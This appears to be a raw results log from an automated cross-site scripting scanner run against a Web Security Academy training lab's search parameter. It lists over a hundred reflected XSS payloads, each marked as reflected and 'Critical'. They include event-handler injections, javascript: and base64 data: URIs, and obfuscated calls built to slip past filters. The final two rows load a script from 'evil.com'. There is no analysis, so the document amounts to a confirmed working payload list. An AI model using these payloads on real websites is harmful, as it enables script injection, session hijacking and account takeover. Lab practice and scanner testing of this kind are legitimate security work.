+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<figcaption onmouseover=alert(1)>X</figcaption>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button ondblclick=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onmousedown=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button onmouseup=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1) onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-06 15:05:33,https://0a0800ed04c553ef81e90c9b008a004b.web-security-academy.net/,GET,search,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
